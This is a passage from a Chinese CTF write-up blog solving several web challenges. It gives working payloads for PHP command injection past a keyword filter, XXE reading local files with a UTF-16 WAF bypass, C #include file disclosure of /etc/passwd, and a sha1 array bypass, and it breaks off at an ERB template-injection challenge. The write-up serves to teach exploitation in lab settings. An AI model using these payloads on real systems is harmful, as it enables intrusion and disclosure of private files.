class="hljs-string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="hljs-variable">$comm2</span>))<br>    <span class="hljs-variable">$comm2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;#flag in /flag&quot;</span>;<br><br><span class="hljs-variable">$comm1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm1</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><span class="hljs-variable">$comm2</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$comm2</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;file <span class="hljs-subst">$comm1</span> <span class="hljs-subst">$comm2</span>&quot;</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>绕过题，最终要利用system命令，因为file命令打不开文件，只能判别文件的类型，因此我们在comm1中要利用引号和分号来进行命令的控制。<br>仔细一看可以发现第一个过滤比第二个过滤少，可以发现反向输出tac 头几行输出head 读取文件sort都没有过滤，flag被过滤了，我们可以用模糊匹配来进行替代，因此我们可以利用了<br>因为第二个过滤里面过滤了分号 双引号 因此我们要在comm1参数里面做文章<br>构造如下</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">/?comm1=<span class="hljs-string">&quot;;sort+/fla?;&quot;</span>&amp;comm2=<span class="hljs-number">1</span><br>利用第一个分号来将comm1前面的双引号拼接闭合，后面那个分号将后面的闭合<br>不闭合的话到<span class="hljs-keyword">cmd</span><span class="language-bash">里面语句会变成</span><br><span class="hljs-string">&quot;file&quot;</span>;sort……<span class="hljs-string">&quot;&quot;</span><br>闭合后<span class="hljs-keyword">cmd</span><span class="language-bash">语句应该是</span><br><span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-string">&quot;file;sort+/fla?;&quot;</span>1<span class="hljs-string">&quot;&quot;</span></span><br></code></pre></td></tr></table></figure>
<p>file后面可以加一个index.php，不加也没事，因为分号;不会因为前面的命令执行对错而影响后面的</p>
<p>还有好多可以替代cat的</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cat /flag<br>tac /flag<br>head /flag<br>tail /flag<br>more /flag<br>less /flag<br>od -c /flag<br>fmt /flag<br>rev /flag<br>tailf /flag<br>nl /*<br><span class="hljs-number">1</span>.od /*<br><span class="hljs-number">2</span>.python执行<br>s = &#x27;<span class="hljs-number">000000</span>0 <span class="hljs-number">066146</span> <span class="hljs-number">063541</span> <span class="hljs-number">062573</span> <span class="hljs-number">061470</span> <span class="hljs-number">063066</span> <span class="hljs-number">030070</span> <span class="hljs-number">026463</span> <span class="hljs-number">063142</span> <span class="hljs-number">000002</span>0 <span class="hljs-number">061065</span> <span class="hljs-number">032055</span> <span class="hljs-number">033071</span> <span class="hljs-number">026460</span> <span class="hljs-number">033070</span> <span class="hljs-number">031546</span> <span class="hljs-number">034455</span> <span class="hljs-number">030471</span> <span class="hljs-number">000004</span>0 <span class="hljs-number">061070</span> <span class="hljs-number">060463</span> <span class="hljs-number">030465</span> <span class="hljs-number">031463</span> <span class="hljs-number">076461</span> <span class="hljs-number">000012</span> <span class="hljs-number">000005</span>3&#x27;<br>print(b&#x27;&#x27;.join(int(ss, <span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">2</span>, &#x27;little&#x27;) for ss in s.split()))<br></code></pre></td></tr></table></figure>
<p>都可以看到flag中的内容</p>
<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p><img src="/images/C2896C1B319D49d199C331C22799699C.png" srcset="/img/loading.gif" lazyload></p>
<p>重新加载了几遍，还是405<br>去搜搜405是啥意思<br>得到的结果是<br>1:请求方法错误，如：post 用了get 请求方式<br>2：请求的路径根本不对，也会出现405</p>
<p>那么我们post一个参数id<br>ok页面恢复正常</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>] !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam1&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;roam2&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();  <span class="hljs-comment">// collect information from phpinfo!</span><br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
<p>还以为是sha1碰撞，没啥用，可以用数组绕过,sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span><br><span class="hljs-attribute">roam1</span>[]=<span class="hljs-number">12</span>&amp;roam2[]=<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>在phpinfo里找flag<br><img src="/images/4240ADC1636E4b54884EF4FABDAB02AD.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>本题需要上传一个xml文件<br>here给出了xml的格式<br><img src="/images/73A5E494197347c886E54DE259A48FF9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/187F9BE1A2024dbbA31809BA00868B71.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>奇怪的是复现的时候同样的代码竟然被拦了，换成utf-16就好了，但是当时这点使用的utf-8的</p>
<p>查了如何绕过WAF保护的XXE的资料：</p>
<p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</p>
<p>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</p>
<p><img src="/images/1A03A7F1485B413eAEF5D69165FAA8A0.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到flag显示的不全<br><img src="/images/B1B2F59AF52C4cb6B67F336D062D1BE2.png" srcset="/img/loading.gif" lazyload><br>这里多了个参数。把它加上</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>不是很明白是什么编译器<br>先随便输了点<br>wp说是c语言编译器<br>输入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello, World! \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>下载了一个文件，啥都没有<br>这里有文件包含<br>猜测flag应该是以文件形式存在服务器中，尝试使用#include ‘’预处理命令，引入文件&#x2F;etc&#x2F;passwd，构造代码：</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/etc/passwd&#x27;</span></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/B735E622B3A94cc88707F7ECF9195975.png" srcset="/img/loading.gif" lazyload><br>报错提示了应该为双引号</p>
<p><img src="/images/1DC153B70A9E4488B4BBB7A6E8EC5C14.png" srcset="/img/loading.gif" lazyload><br>显示了一些，证明存在文件包含</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/176F9EFE0C4E40deA0BE3ECAD7B64841.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><img src="/images/8251443A5D874fc89C35D4E1D6939CDF.png" srcset="/img/loading.gif" lazyload></p>
<p>买flag，reset是重置Jinkela，work是让钱增加一定的数量，这题肯定不可能是这样让钱够的。看一下cookie，发现好像是jwt，解码一下：<br><img src="/images/B29EBEC6644C4e218E46CBD627EC5551.png" srcset="/img/loading.gif" lazyload><br>jkI是存储在jwt里面的，所以这题很明显是要伪造jwt才能让钱足够来购买flag了。<br>这题的jwt是HS256算法，尝试了一下无算法，弱密钥爆破等都不行。<br>转变思路<br>这题有robots.txt文件，里面指向了一个页面</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/filebak<br></code></pre></td></tr></table></figure>
<p>进入可看到源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br><br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br><br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br><br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br><br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br><br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br><br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>送给chat说这是ruby语言</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>主要代码是这段<br>这里有用到erb模板注入</p>
